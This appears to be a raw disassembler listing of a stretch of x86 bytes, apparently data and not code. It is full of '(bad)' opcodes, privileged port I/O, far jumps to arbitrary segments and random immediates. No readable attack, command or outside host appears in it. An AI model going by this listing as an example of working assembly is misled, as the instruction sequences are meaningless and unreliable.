  491e28:	fs xchg esp,eax
  491e2a:	or     BYTE PTR [edi+ebx*2-0x12],dl
  491e2e:	inc    edx
  491e2f:	jne    0x491e3b
  491e31:	mov    edi,0x831a8802
  491e36:	test   eax,0x5290c700
  491e3b:	adc    edx,eax
  491e3d:	fnstenv [ecx+0xf]
  491e40:	clc    
  491e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491e42:	xor    al,0x8d
  491e44:	aad    0x20
  491e46:	hlt    
  491e47:	test   DWORD PTR [ebx],edx
  491e49:	fld    QWORD PTR [ecx-0x5e]
  491e4c:	outs   dx,BYTE PTR ds:[esi]
  491e4d:	xor    edx,DWORD PTR [eax-0x69e7c182]
  491e53:	adc    esi,DWORD PTR [esi]
  491e55:	out    dx,al
  491e56:	enter  0xe36,0x18
  491e5a:	test   BYTE PTR [eax+0x510185d],bh
  491e60:	or     BYTE PTR [eax+0x75],bh
  491e63:	es jo  0x491df6
  491e66:	cdq    
  491e67:	adc    dl,BYTE PTR [edi+ecx*1+0x56a21c03]
  491e6e:	or     edi,0x41
  491e71:	push   eax
  491e72:	test   esp,0x451eacf2
  491e78:	dec    esp
  491e79:	xor    al,0x44
  491e7b:	fld    QWORD PTR [eax+eax*1-0x63]
  491e7f:	xchg   edi,eax
  491e80:	cmp    al,0x42
  491e82:	test   BYTE PTR [eax+0x21cd8d2e],al
  491e88:	xor    edx,DWORD PTR ds:0x1247784
  491e8e:	pop    esp
  491e8f:	sub    dh,BYTE PTR [edi+esi*8+0x5bd40e86]
  491e96:	xchg   ebx,eax
  491e97:	push   edi
  491e98:	mov    ?,WORD PTR [edx+0x12]
  491e9b:	or     BYTE PTR [edi+0x53438659],cl
  491ea1:	add    al,0xd
  491ea3:	nop
  491ea4:	inc    edi
  491ea5:	push   0x36451fff
  491eaa:	or     eax,0x7d2c0c7
  491eaf:	xor    eax,0xca6f968a
  491eb4:	js     0x491ec3
  491eb6:	sbb    DWORD PTR [ebx+0x8],edx
  491eb9:	push   ebx
  491eba:	dec    eax
  491ebb:	and    DWORD PTR [ecx-0x13c1a8cc],0xc35e4064
  491ec5:	in     al,dx
  491ec6:	popf   
  491ec7:	fstp   QWORD PTR [edi]
  491ec9:	in     al,dx
  491eca:	pop    esp
  491ecb:	xchg   DWORD PTR [eiz*1-0x4e721363],ecx
  491ed2:	cmp    DWORD PTR [edi*8+0x420d61a2],ebp
  491ed9:	jmp    DWORD PTR [ebx-0x225b5e77]
  491edf:	pop    ebp
  491ee0:	lock fwait
  491ee2:	inc    ebp
  491ee3:	cmp    ebp,DWORD PTR [eax]
  491ee5:	ret    
  491ee6:	ins    DWORD PTR es:[edi],dx
  491ee7:	and    eax,0x5c794041
  491eec:	ret    0x837
  491eef:	mov    ebp,0xebd1f91
  491ef4:	jmp    0x491f43
  491ef6:	cmp    BYTE PTR [eax-0x3e1ba8f9],dl
  491efc:	in     al,dx
  491efd:	fld    QWORD PTR [eax+edx*4+0x2a]
  491f01:	rol    DWORD PTR [ebp+0x8bc846f],1
  491f07:	jns    0x491e9e
  491f09:	and    BYTE PTR [edx+0x20],bl
  491f0c:	in     al,0xc8
  491f0e:	sub    esp,esp
  491f10:	mov    ds:0x75207a74,al
  491f15:	and    ah,ah
  491f17:	add    eax,0x209c0bc9
  491f1c:	dec    ebp
  491f1d:	and    DWORD PTR [eax+0x1222f213],edx
  491f23:	and    DWORD PTR [edi+0x23902fa0],eax
  491f29:	scas   eax,DWORD PTR es:[edi]
  491f2a:	xor    ah,BYTE PTR [ecx]
  491f2c:	sub    eax,0x8b215421
  491f31:	nop
  491f32:	pop    ss
  491f33:	and    al,0x5
  491f35:	and    dh,BYTE PTR [edx-0x7b]
  491f38:	mov    esp,0xca2ca90
  491f3d:	jmp    0xce5:0x7210e4a3
  491f44:	and    cl,BYTE PTR [ebx+0x41]
  491f47:	pop    esi
  491f48:	dec    esp
  491f49:	iret   
  491f4a:	and    dl,BYTE PTR [bx+si]
  491f4d:	rol    eax,cl
  491f4f:	sub    al,0xa1
  491f51:	push   esp
  491f52:	aad    0x7b
  491f54:	or     BYTE PTR [ecx],ah
  491f56:	in     al,0x6e
  491f58:	and    cl,BYTE PTR [esi]
  491f5a:	mov    edi,0x53204c84
  491f5f:	mov    DWORD PTR [esp+eax*1-0x31cdee87],0x6ac1232b
  491f6a:	push   ecx
  491f6b:	adc    cl,dh
  491f6d:	sbb    DWORD PTR [edi+0x39087211],eax
  491f73:	xchg   DWORD PTR [eax+0x32],eax
  491f76:	and    eax,DWORD PTR [ebx-0x14]
  491f79:	add    BYTE PTR [ecx],bh
  491f7b:	mov    esp,DWORD PTR [ebx]
  491f7d:	ins    BYTE PTR es:[edi],dx
  491f7e:	mov    edi,0x18581592
  491f83:	and    al,0xbf
  491f85:	inc    esp
  491f86:	and    dh,BYTE PTR [eax]
  491f88:	test   al,0xef
  491f8a:	mov    ebp,0xa2099658
  491f8f:	pop    edx
  491f90:	mov    ebx,DWORD PTR [ebx*4-0x42df615c]
  491f97:	outs   dx,BYTE PTR ds:[esi]
  491f98:	sub    BYTE PTR [ebx-0x57],dl
  491f9b:	ja     0x491ffb
  491f9d:	shl    BYTE PTR [ebx-0x6d],cl
  491fa0:	neg    ebp
  491fa2:	hlt    
  491fa3:	sub    esp,DWORD PTR ds:0x40640500
  491fa9:	hlt    
  491faa:	dec    ebp
  491fab:	mov    al,ds:0x3158f71
  491fb0:	mov    edx,0x41ca3e27
  491fb5:	push   0xfeb153f
  491fba:	lea    ecx,[ebp-0x73]
  491fbd:	mov    al,0x93
  491fbf:	or     DWORD PTR [ebx+0x6109b3a1],esp
  491fc5:	or     DWORD PTR [edx+edx*8+0x12],0xb47a98b0
  491fcd:	stc    
  491fce:	add    ebx,ebp
  491fd0:	sub    al,0x2d
  491fd2:	push   es
  491fd3:	gs push cs
  491fd5:	popa   
  491fd6:	pop    ss
  491fd7:	sti    
  491fd8:	or     eax,0x5035041f
  491fdd:	jnp    0x491fe5
  491fdf:	shl    BYTE PTR ds:0xa01352b8,1
  491fe5:	cdq    
  491fe6:	push   0x41
  491fe8:	inc    ebx
  491fe9:	test   DWORD PTR [eax+0x13],ebp
  491fec:	popf   
  491fed:	or     BYTE PTR [eax],cl
  491fef:	xor    BYTE PTR [eax+ebx*4+0x2ecc5cb5],al
  491ff6:	gs call 0x60084088
  491ffc:	ins    BYTE PTR es:[edi],dx
  491ffd:	in     al,0x16
  491fff:	fistp  DWORD PTR [esp+esi*1]
  492002:	cmp    esi,DWORD PTR [ebp+ebx*1-0x61]
  492006:	inc    ebx
  492007:	add    DWORD PTR [edx],ebx
  492009:	pop    esi
  49200a:	push   ss
  49200b:	mov    ch,0x6b
  49200d:	adc    BYTE PTR [esi+0x70],cl
  492010:	inc    ecx
  492011:	and    DWORD PTR [ebx],ebp
  492013:	ret    
  492014:	leave  
  492015:	call   0x15cc8d26
  49201a:	jb     0x492097
  49201c:	repnz push es
  49201e:	xchg   esi,eax
  49201f:	cwde   
  492020:	sub    al,0xd1
  492022:	push   ebx
  492023:	xor    cl,BYTE PTR [edx-0x23]
  492026:	ss je  0x492086
  492029:	pop    ecx
  49202a:	sub    al,0x62
  49202c:	mov    BYTE PTR [edi-0x72f76ae3],ch
  492032:	or     eax,0x5258914a
  492037:	sbb    bl,BYTE PTR [esi-0x60]
  49203a:	es loope 0x492044
  49203d:	mul    BYTE PTR [ebx+ebp*8]
  492040:	mov    ds:0x45db10f3,eax
  492045:	push   ecx
  492046:	lahf   
  492047:	sub    BYTE PTR [ecx],0xc8
  49204a:	sbb    DWORD PTR [eax+0x5a],ebx
  49204d:	mov    esp,ss
  49204f:	cmp    ebx,DWORD PTR [ecx+0x22]
  492052:	inc    ecx
  492053:	dec    esp
  492054:	cmp    DWORD PTR [edx-0x5f46de10],edi
  49205a:	js     0x492044
  49205c:	jle    0x93545a2
  492062:	inc    ebx
  492063:	mov    edx,0x71e7ec21
  492068:	sbb    BYTE PTR [ecx],dh
  49206a:	mov    ch,0x7a
  49206c:	xchg   DWORD PTR [eax],ecx
  49206e:	jo     0x49205f
  492070:	(bad)  
  492071:	rol    bl,cl
  492073:	jae    0x4920c2
  492075:	xchg   esi,eax
  492076:	in     al,dx
  492077:	dec    ebp
  492078:	mov    edi,ebp
  49207a:	mul    dl
  49207c:	xchg   BYTE PTR [edi+0x21d887ec],ch
  492082:	dec    esp
  492083:	sub    ebx,eax
  492085:	push   ebx
  492086:	and    DWORD PTR [ebx],0x4715b179
  49208c:	in     al,dx
  49208d:	lock (bad) 
  49208f:	popa   
  492090:	mov    ebx,DWORD PTR [ecx-0x76b4a70b]
  492096:	in     al,0xcf
  492098:	js     0x4920c0
  49209a:	rol    BYTE PTR [eax+0x2a],cl
  49209d:	daa    
  49209e:	in     al,dx
  49209f:	in     al,dx
  4920a0:	adc    edx,DWORD PTR [ebx+0x5e2b1521]
  4920a6:	sub    DWORD PTR [edi-0x56ae5bce],esp
  4920ac:	es xor eax,0x6ad092f5
  4920b2:	scas   eax,DWORD PTR es:[edi]
  4920b3:	mov    eax,ds:0xe2350654
  4920b8:	add    cl,0xc
  4920bb:	sub    cl,cl
  4920bd:	push   ss
  4920be:	xlat   BYTE PTR ds:[ebx]
  4920bf:	add    al,bh
  4920c1:	mov    al,ds:0x8f1b4206
  4920c6:	mov    al,ds:0xc864ab08
  4920cb:	cmp    eax,0x2ae339f6
  4920d0:	fwait
  4920d1:	push   cs
  4920d2:	push   edx
  4920d3:	add    eax,0x35c10fc6
  4920d8:	stos   DWORD PTR es:[edi],eax
  4920d9:	sub    al,0x20
  4920db:	push   ebp
  4920dc:	xor    BYTE PTR [ebp+0x721a064d],dl
  4920e2:	jmp    0xa376:0x23b7f881
  4920e9:	lea    edi,[ecx-0x17975eac]
  4920ef:	push   cs
  4920f0:	mov    DWORD PTR [esi+0x74],edx
  4920f3:	daa    
  4920f4:	push   esp
  4920f5:	addr16 pop eax
  4920f7:	daa    
  4920f8:	mov    edi,0xf1ac0b35
  4920fd:	pop    ebp
  4920fe:	and    al,0xa5
  492100:	(bad)  
  492101:	fcomp  DWORD PTR [ebp+eiz*8+0x6024aad5]
  492108:	scas   eax,DWORD PTR es:[edi]
  492109:	scas   eax,DWORD PTR es:[edi]
  49210a:	dec    esi
  49210b:	mov    ch,0x5a
  49210d:	sbb    BYTE PTR [ebp-0x57],0xa3
  492111:	sub    BYTE PTR [eax-0x47be56cb],ah
  492117:	or     al,0xa4
  492119:	mov    cl,0xab
  49211b:	nop
  49211c:	adc    DWORD PTR [esi-0x141bd3cb],eax
  492122:	push   es
  492123:	mov    ebx,0x1d452869
  492128:	fdivr  DWORD PTR [edx+0x41822334]
  49212e:	(bad)  
  49212f:	jne    0x49211c
  492131:	rol    BYTE PTR [ebx],0xf7
  492134:	mov    ?,WORD PTR [edx]
  492136:	and    al,0x1c
  492138:	dec    edx
  492139:	sbb    edi,DWORD PTR [edx+0x3549223a]
  49213f:	pushf  
  492140:	cmp    ch,BYTE PTR [ebx-0x61]
  492143:	xchg   esi,eax
  492144:	cmp    DWORD PTR [ecx+0x76],edi
  492147:	add    DWORD PTR [eax],edx
  492149:	push   ss
  49214a:	jns    0x4920dc
  49214c:	dec    ebx
  49214d:	sbb    edi,DWORD PTR [esi]
  49214f:	(bad)  
  492150:	jo     0x49217a
  492152:	inc    ebp
  492153:	push   ss
  492154:	test   al,0xef
  492156:	or     BYTE PTR [ebp+0x704cf839],cl
  49215c:	cmp    al,0xe0
  49215e:	dec    ecx
  49215f:	stos   BYTE PTR es:[edi],al
  492160:	sub    BYTE PTR ds:0xe4bc3c3,al
  492166:	add    bh,BYTE PTR [edi+0x1529b4f0]
  49216c:	enter  0xe401,0x11
  492170:	xchg   edi,eax
  492171:	sub    DWORD PTR [edx+0x29],edi
  492174:	aad    0xb0
  492176:	mov    al,BYTE PTR [edi+esi*2]
  492179:	and    DWORD PTR [ebp-0x7ee1bd44],eax
  49217f:	sub    DWORD PTR [esi+0x29001429],ebx
  492185:	jns    0x492142
  492187:	sub    DWORD PTR [edi+0x68],edx
  49218a:	push   0xe0c685d2
  49218f:	push   ds
  492190:	dec    eax
  492191:	add    DWORD PTR [esi],edi
  492193:	icebp  
  492194:	sbb    al,0xe0
  492196:	imul   BYTE PTR [edx]
  492198:	push   esp
  492199:	or     DWORD PTR [ecx],eax
  49219b:	inc    ecx
  49219c:	add    DWORD PTR [eax],esi
  49219e:	dec    ecx
  49219f:	aad    0xd8
  4921a1:	aam    0x39
  4921a3:	and    al,0xf0
  4921a5:	inc    eax
  4921a6:	xchg   ecx,eax
  4921a7:	dec    ecx
  4921a8:	fidiv  WORD PTR [eax-0x67]
  4921ab:	pop    edi
  4921ac:	mov    bh,0x2a
  4921ae:	hlt    
  4921af:	fsubr  DWORD PTR [ecx-0x8879b7e]
  4921b5:	push   edi
  4921b6:	inc    esi
  4921b7:	cli    
  4921b8:	inc    edx
  4921b9:	adc    BYTE PTR [ebx+0x53b4d121],0x94
  4921c0:	ss mov cl,0x6
  4921c3:	push   0x32ded20c
  4921c8:	or     BYTE PTR [edx-0x7c],bh
  4921cb:	push   esp
  4921cc:	xor    al,0xe0
  4921ce:	mov    ds:0xca4b49b5,al
  4921d3:	loopne 0x4921ef
  4921d5:	pop    ss
  4921d6:	dec    esi
  4921d7:	in     al,0x10
  4921d9:	je     0x4921f5
  4921db:	and    BYTE PTR [edi+0x37],dl
  4921de:	and    al,0x5c
  4921e0:	sar    DWORD PTR [edx],1
  4921e2:	and    al,0x1d
  4921e4:	cwde   
  4921e5:	fisubr WORD PTR [ebx+edx*1+0x7931e548]
  4921ec:	mov    esi,0x1bdbf42a
  4921f1:	and    dl,BYTE PTR [ebp+esi*2+0x38fd3938]
  4921f8:	sub    cl,ch
  4921fa:	xor    al,0x28
  4921fc:	fsubrp st(0),st
  4921fe:	stos   BYTE PTR es:[edi],al
  4921ff:	inc    edx
  492200:	or     DWORD PTR [ecx+0x3d],esp
  492203:	outs   dx,DWORD PTR ds:[esi]
  492204:	fwait
  492205:	sub    ch,BYTE PTR [edi-0x7ef638be]
  49220b:	and    eax,0x91b54404
  492210:	sbb    BYTE PTR [ecx+0x7d],0x6b
  492214:	mov    DWORD PTR [eax-0x50a5a6c6],edx
  49221a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49221b:	ins    BYTE PTR es:[edi],dx
  49221c:	mov    cl,0x6
  49221e:	pop    esp
  49221f:	xor    eax,0xe229fb57
  492224:	cmp    eax,0x373b025b
  492229:	xor    BYTE PTR [edx-0x38],0xb
  49222d:	jmp    FWORD PTR [ebx]
  49222f:	inc    ebp
  492230:	mov    eax,DWORD PTR [ebx+0xc]
  492233:	mov    al,ds:0xf37312f4
  492238:	pop    edx
  492239:	test   BYTE PTR [ecx+esi*2],dl
  49223c:	pop    esi
  49223d:	(bad)  
  49223e:	jmp    0x2c4c:0x4f5ec906
  492245:	sbb    BYTE PTR ds:[ecx],ch
  492248:	cwde   
  492249:	dec    esp
  49224a:	push   edi
  49224b:	(bad)  
  49224c:	fs push edx
  49224e:	pop    edi
  49224f:	imul   esi,DWORD PTR [edx+0x79],0x57
  492253:	lods   al,BYTE PTR ds:[esi]
  492254:	jp     0x4921e4
  492256:	jbe    0x4922c3
  492258:	mov    edi,0x1cbebf16
  49225d:	mov    ds:0x4f5d53d2,al
  492262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492263:	sub    eax,0x50c89f45
  492268:	fsub   DWORD PTR [esi+0x10]
  49226b:	or     DWORD PTR [ebx+eiz*8+0x42],edx
  49226f:	mov    esi,0x1ccf3538
  492274:	jno    0x49229d
  492276:	add    BYTE PTR [esi+edi*4],ch
  492279:	push   es
  49227a:	mov    BYTE PTR [eax+0x2e],0xd9
  49227e:	cmp    ebx,DWORD PTR [esi+ebp*2+0x69]
  492282:	adc    al,0x14
  492284:	mov    ebp,0x8194b5ff
  492289:	data16 adc BYTE PTR [edx],dl
  49228c:	int    0x18
  49228e:	retf   
  49228f:	not    DWORD PTR [ecx+0x2b8d561]
  492295:	or     eax,DWORD PTR [edx+edx*4]
  492298:	cli    
  492299:	rcl    DWORD PTR [ebx+eax*1+0x1f87f62],0x1f
  4922a1:	pop    eax
  4922a2:	xor    BYTE PTR [edi+0x2f],ch
  4922a5:	push   cs
  4922a6:	js     0x4922aa
  4922a8:	jmp    0x4922be
  4922aa:	pop    eax
  4922ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4922ac:	stc    
  4922ad:	imul   edx,DWORD PTR [eax],0xbeb0304
  4922b3:	add    esp,eax
  4922b5:	adc    ah,ah
  4922b7:	or     ch,dh
  4922b9:	pop    ss
  4922ba:	(bad)  
  4922bb:	rol    BYTE PTR [ebx],0x18
  4922be:	mov    edx,0xa3494dc4
  4922c3:	inc    ecx
  4922c4:	ret    0xfc1d
  4922c7:	outs   dx,BYTE PTR ds:[esi]
  4922c8:	aas    
  4922c9:	adc    al,0xe1
  4922cb:	and    al,dl
  4922cd:	cmp    dh,al
  4922cf:	adc    BYTE PTR [ecx],dl
  4922d1:	mov    esi,0x6f1f8404
  4922d6:	int3   
  4922d7:	out    0x1a,eax
  4922d9:	inc    esp
  4922da:	mov    ss,WORD PTR [ecx]
  4922dc:	ja     0x4922eb
  4922de:	or     eax,0x80fee041
  4922e3:	bound  eax,QWORD PTR [esi]
  4922e5:	cs test eax,0x2430d1fb
  4922eb:	test   eax,0x10c86cbe
  4922f0:	mov    ecx,0x5115ce1
  4922f5:	mov    ecx,0x9e082790
  4922fa:	sub    DWORD PTR [ecx+0x14641ad6],ecx
  492300:	cs push ebx
  492302:	mov    BYTE PTR [ebx+0x14],0x40
  492306:	rol    BYTE PTR [ebx+0x4b2c8494],cl
  49230c:	shl    edx,1
  49230e:	push   ds
  49230f:	add    eax,0x3c298f1d
  492314:	and    al,0xd6
  492316:	add    ah,ch
  492318:	xchg   ebp,eax
  492319:	mov    edx,edi
  49231b:	iret   
  49231c:	add    al,0x45
  49231e:	push   es
  49231f:	(bad)  
  492321:	inc    eax
  492322:	add    al,0xe8
  492324:	pop    esi
  492325:	cli    
  492326:	dec    eax
  492327:	sbb    DWORD PTR [esi],eax
  492329:	inc    esi
  49232a:	mov    eax,ecx
  49232c:	out    dx,al
  49232d:	or     DWORD PTR [eax-0x41d8cea6],0x1f90ea91
  492337:	test   BYTE PTR [edx-0x290bd097],bh
  49233d:	push   edi
  49233e:	mov    DWORD PTR [ecx],ecx
  492340:	jne    0x492305
  492342:	add    eax,0x1442dc1c
  492347:	mov    WORD PTR [esi],fs
  492349:	mov    esp,0x1b406a2e
  49234e:	inc    ecx
  49234f:	retf   
  492350:	pop    ebx
  492351:	rcr    BYTE PTR [ecx-0x50],1
  492354:	inc    esp
  492355:	aas    
  492356:	cdq    
  492357:	push   es
  492358:	push   es
  492359:	inc    ebx
  49235a:	cmc    
  49235b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49235c:	(bad)  [edx]
  49235e:	mov    WORD PTR gs:[eax+0x44],?
  492362:	mov    ds:0xd3ef504e,al
  492367:	mov    bh,0x2
  492369:	push   ds
  49236a:	cld    
  49236b:	dec    ebp
  49236c:	push   ds
  49236d:	dec    esp
  49236e:	xchg   ebx,eax
  49236f:	cmp    bh,bh
  492371:	(bad)  
  492372:	jmp    0x4923a6
  492374:	test   DWORD PTR [ebx+eiz*2],0x5fdd2d02
  49237b:	mov    ah,0xc8
  49237d:	adc    BYTE PTR [ebx-0x31df98fe],bh
  492383:	(bad)  
  492384:	sub    BYTE PTR [ecx],bh
  492386:	add    eax,0x62d3aac0
  49238b:	ret    
  49238c:	push   0x17
  49238e:	test   BYTE PTR [eax-0x1],ah
  492391:	jbe    0x492327
  492393:	xchg   edx,eax
  492394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492395:	add    BYTE PTR [esi-0x7c],ah
  492398:	das    
  492399:	data16 hlt 
  49239b:	hlt    
  49239c:	jo     0x492380
  49239e:	cmp    eax,esp
  4923a0:	xchg   ebx,eax
  4923a1:	sub    DWORD PTR [eax],0x7b
  4923a4:	inc    eax
  4923a5:	retf   0xe48e
  4923a8:	jo     0x4923d9
  4923aa:	mov    ch,BYTE PTR [edx+0x50c25875]
  4923b0:	daa    
  4923b1:	pop    esp
  4923b2:	jmp    DWORD PTR [esi]
  4923b4:	jne    0x4923fb
  4923b6:	sbb    BYTE PTR [ebx],0x5f
  4923b9:	sub    al,bh
  4923bb:	dec    eax
  4923bc:	js     0x4923d3
  4923be:	out    0x55,eax
  4923c0:	push   ecx
  4923c1:	stos   DWORD PTR es:[edi],eax
  4923c2:	mov    eax,ebp
  4923c4:	loop   0x492356
  4923c6:	push   0xffffffd1
  4923c8:	inc    esp
  4923c9:	or     BYTE PTR [esi+esi*2],al
  4923cc:	pop    ebp
  4923cd:	fwait
  4923ce:	dec    eax
  4923cf:	add    eax,0x2d7f46ab
  4923d4:	adc    al,0x44
  4923d6:	gs inc eax
  4923d8:	ret    
  4923d9:	rcr    BYTE PTR [edi+0x34],cl
  4923dc:	pop    es
  4923dd:	jo     0x492407
  4923df:	inc    ecx
  4923e0:	je     0x4923a5
  4923e2:	(bad)  
  4923e3:	mov    esi,0xe7680028
  4923e8:	add    eax,0x6484a41f
  4923ed:	inc    esi
  4923ee:	add    al,0x13
  4923f0:	nop
  4923f1:	dec    edx
  4923f2:	inc    ecx
  4923f3:	inc    ebx
  4923f4:	inc    edi
  4923f5:	ins    DWORD PTR es:[edi],dx
  4923f6:	pop    edi
  4923f7:	and    DWORD PTR [eax-0x1e30edef],0xd2050584
  492401:	lock add DWORD PTR [ebx+0x2a],ecx
  492405:	mov    edi,gs
  492407:	and    dl,BYTE PTR [ecx]
  492409:	add    eax,0xdd7c020
  49240e:	pop    ecx
  49240f:	fcmovb st,st(2)
  492411:	adc    esp,ebp
  492413:	add    eax,0xa6a99ec3
  492418:	aaa    
  492419:	jle    0x49246a
  49241b:	gs dec esp
  49241d:	mov    ch,0x28
  49241f:	jecxz  0x492474
  492421:	sub    eax,esp
  492423:	ins    DWORD PTR es:[edi],dx
  492424:	jnp    0x49246d
  492426:	pop    es
  492427:	test   DWORD PTR [ecx+0x21],edx
  49242a:	sub    ch,cl
  49242c:	add    ecx,ebp
  49242e:	ins    BYTE PTR es:[edi],dx
  49242f:	fdiv   st(4),st
  492431:	or     ah,BYTE PTR [ebx+edi*1]
  492434:	inc    edi
  492435:	add    al,ah
  492437:	test   BYTE PTR [ecx+0x58e8f0d7],dl
  49243d:	pop    ebx
  49243e:	cli    
  49243f:	rol    ch,cl
  492441:	xor    eax,0x999e194c
  492446:	pop    esp
  492447:	and    esp,DWORD PTR [esi+0x5282ca81]
  49244d:	ja     0x4923d6
  49244f:	and    al,0x91
  492451:	adc    DWORD PTR [edx+0x70],0x1e1a00df
  492458:	imul   ebp,eax,0xad353786
  49245e:	sub    al,0x68
  492460:	in     al,0x43
  492462:	dec    eax
  492463:	lea    edi,[ebp+0x23]
  492466:	shl    BYTE PTR ds:0xd363c420,0x98
  49246d:	mov    eax,0x44f4ff01
  492472:	call   0x8d786685
  492477:	ret    0x132e
  49247a:	repnz mov WORD PTR [ebx],ss
  49247d:	ret    0x40c6
  492480:	jne    0x4924b8
  492482:	push   esi
  492483:	repnz inc eax
  492485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492486:	jae    0x49249c
  492488:	jne    0x49245b
  49248a:	mov    dl,BYTE PTR [ebx-0x4]
  49248d:	inc    ebp
  49248e:	lds    esp,FWORD PTR [ecx-0x3c6cb04c]
  492494:	out    0x7,eax
  492496:	xchg   edi,eax
  492497:	inc    ebx
  492498:	jle    0x4924ba
  49249a:	push   cs
  49249b:	hlt    
  49249c:	xor    DWORD PTR [esp+ebp*4+0x65],ebp
  4924a0:	dec    eax
  4924a1:	pop    esi
  4924a2:	and    ebx,edi
  4924a4:	xor    DWORD PTR [ebx+esi*2+0x46],ebp
  4924a8:	ret    0x5378
  4924ab:	mov    ebx,0x35cb8b74
  4924b0:	add    ecx,ebx
  4924b2:	push   eax
  4924b3:	cs pusha 
  4924b5:	xor    ebx,DWORD PTR fs:[ebx-0x6458e7b8]
  4924bc:	cdq    
  4924bd:	and    BYTE PTR [ecx],ch
  4924bf:	je     0x4924f3
  4924c1:	and    ch,cl
  4924c3:	(bad)  
  4924c4:	retf   
  4924c5:	pop    esi
  4924c6:	and    dl,BYTE PTR [eax+0x654807c]
  4924cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4924cd:	mov    al,ds:0x1952b080
  4924d2:	nop
  4924d3:	retf   0xbc84
  4924d6:	mov    al,cl
  4924d8:	gs inc eax
  4924da:	sub    al,BYTE PTR [ebx]
  4924dc:	mov    esp,fs
  4924de:	nop
  4924df:	xchg   edi,eax
  4924e0:	lods   al,BYTE PTR ds:[esi]
  4924e1:	or     al,0x48
  4924e3:	hlt    
  4924e4:	xchg   esp,eax
  4924e5:	add    al,0x34
  4924e7:	cwde   
  4924e8:	dec    eax
  4924e9:	gs inc eax
  4924eb:	sub    dl,BYTE PTR [esp+ebx*4]
  4924ee:	and    al,0x95
  4924f0:	add    DWORD PTR [ecx-0x5bcb5ff4],ebp
  4924f6:	inc    esp
  4924f7:	push   es
  4924f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4924f9:	xor    ah,BYTE PTR [eax]
  4924fb:	test   al,0x54
  4924fd:	lods   al,BYTE PTR ds:[esi]
  4924fe:	nop
  4924ff:	retf   0x5480
  492502:	fs mov al,0x74
  492505:	xchg   edi,eax
  492506:	sub    BYTE PTR [eax+ebx*1-0x4c],ah
  49250a:	jnp    0x492512
  49250c:	mov    ch,0x66
  49250e:	adc    BYTE PTR [edi+0x18109f30],al
  492514:	lds    eax,FWORD PTR [edx]
  492516:	xlat   BYTE PTR ds:[ebx]
  492517:	sub    DWORD PTR [edx+0x8],esp
  49251a:	call   0x9346c130
  49251f:	xchg   BYTE PTR [ebp+0x73e02e62],bl
  492525:	push   0x80fe746f
  49252a:	jne    0x492502
  49252c:	aaa    
  49252d:	dec    eax
  49252e:	xor    al,0x22
  492530:	ins    BYTE PTR es:[edi],dx
  492531:	inc    esi
  492532:	imul   esi,DWORD PTR [edx-0x4a],0x8cd7591
  492539:	pop    ds
  49253a:	dec    esi
  49253b:	hlt    
  49253c:	pop    ds
  49253d:	popa   
  49253e:	shl    DWORD PTR [edx-0x64d0c840],cl
  492544:	push   edx
  492545:	sub    cl,BYTE PTR [esi]
  492547:	sbb    cl,dh
  492549:	adc    al,0xd5
  49254b:	(bad)  
  49254c:	ins    BYTE PTR es:[edi],dx
  49254d:	sti    
  49254e:	popa   
  49254f:	dec    ecx
  492550:	popf   
  492551:	add    BYTE PTR [ebx],bl
  492553:	ins    DWORD PTR es:[edi],dx
  492554:	jb     0x492507
  492556:	sub    al,0x2d
  492558:	pop    ds
  492559:	jne    0x49259a
  49255b:	push   edi
  49255c:	(bad)  
  49255d:	xchg   esp,eax
  49255e:	aam    0x12
  492560:	sbb    al,0x0
  492562:	stos   DWORD PTR es:[edi],eax
  492563:	mov    edi,0x7d636365
  492568:	pop    ds
  492569:	jge    0x4925a9
  49256b:	dec    ebp
  49256c:	outs   dx,DWORD PTR ds:[esi]
  49256d:	fs jne 0x4925dc
  492570:	gs xor al,cl
  492573:	mov    dh,0x24
  492575:	pop    ds
  492576:	aas    
  492577:	push   edi
  492578:	sbb    eax,0x1c12e30e
  49257d:	test   DWORD PTR ds:0x21a32922,0x21562929
  492587:	inc    eax
  492588:	cmp    BYTE PTR [eax],bl
  49258a:	pop    esp
  49258b:	xchg   edi,ebp
  49258d:	pop    esp
  49258e:	and    al,0x57
  492590:	or     edi,DWORD PTR [edi]
  492592:	nop
  492593:	xchg   esp,eax
  492594:	and    DWORD PTR [edi+0x4],ebp
  492597:	xchg   esi,eax
  492598:	xchg   DWORD PTR [ecx],ecx
  49259a:	xor    eax,0xc9790b94
  49259f:	jo     0x4925b1
  4925a1:	xor    eax,0x1aad5d70
  4925a6:	test   eax,0x4dbd8df
  4925ab:	fsub   QWORD PTR [esi+0x4a96e4dd]
  4925b1:	cmc    
  4925b2:	pop    ebp
  4925b3:	clc    
  4925b4:	fst    QWORD PTR [esi+0x395da731]
  4925bb:	xchg   edx,eax
  4925bc:	add    DWORD PTR [ecx+0x5db864b8],edi
  4925c2:	shl    BYTE PTR [ecx+0x77],0xbc
  4925c6:	add    DWORD PTR cs:[eax+0x73a3636],esi
  4925cd:	fsubp  st(4),st
  4925cf:	imul   eax,DWORD PTR [esi],0xffffffc2
  4925d2:	push   cs
  4925d3:	pop    ebx
  4925d4:	cmp    DWORD PTR [edi],ebp
  4925d6:	test   al,0x1e
  4925d8:	in     al,0xae
  4925da:	inc    ebp
  4925db:	inc    eax
  4925dc:	add    al,0x68
  4925de:	mov    al,ds:0x6e70a761
  4925e3:	cmp    BYTE PTR [edx+0x1],dh
  4925e6:	fadd   QWORD PTR [ebx]
  4925e8:	cmp    WORD PTR [eax],ax
  4925eb:	scas   eax,DWORD PTR es:[edi]
  4925ec:	out    0x7d,al
  4925ee:	add    DWORD PTR [ecx],0xfffffff3
  4925f1:	sub    ch,BYTE PTR [edx+eiz*2+0x6c]
  4925f5:	xor    esp,edi
  4925f7:	adc    al,0x1
  4925f9:	repnz nop
  4925fb:	cmp    esp,0x67
  4925fe:	jb     0x492670
  492600:	xor    DWORD PTR [eax],eax
  492602:	add    esi,DWORD PTR [edx]
  492604:	add    al,0x33
  492606:	or     BYTE PTR [ecx-0x38],bh
  492609:	inc    ebx
  49260a:	push   ds
  49260b:	xor    al,0xc
